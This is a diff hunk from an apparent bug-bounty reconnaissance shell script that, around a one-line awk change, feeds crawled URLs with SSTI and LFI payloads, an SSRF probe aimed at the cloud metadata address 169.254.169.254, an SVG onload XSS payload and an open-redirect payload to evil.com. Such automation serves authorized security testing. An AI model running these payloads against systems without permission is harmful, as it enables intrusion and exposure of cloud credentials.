@@ -164,7 +164,7 @@ enumCrawl(){
     cat ~/tools/payloads/sstipayloads.txt | while read -r line; do cat domains/patterns/ssti.txt | qsreplace "$line" 2> /dev/null | anew -q temporary/ssti.txt;done
     cat ~/tools/payloads/lfipayloads.txt | while read -r line; do cat domains/patterns/lfi.txt | qsreplace "$line" 2> /dev/null | anew -q temporary/lfi.txt;done
     cat domains/patterns/ssrf.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" 2> /dev/null | anew -q temporary/ssrf.txt
-    xargs -a domains/patterns/xss.txt -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >\|\"" | anew -q temporary/xssp.txt
+    xargs -a domains/patterns/xss.txt -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | grep "< >\|\"" | awk '{print $2}' | anew -q temporary/xssp.txt
     cat temporary/xssp.txt 2> /dev/null | qsreplace "\">/><svg/onload=confirm(document.domain)>" 2> /dev/null | anew -q temporary/xss.txt
     cat domains/patterns/redirect.txt | qsreplace "http://www.evil.com/" 2> /dev/null | anew -q temporary/redirect.txt
 }
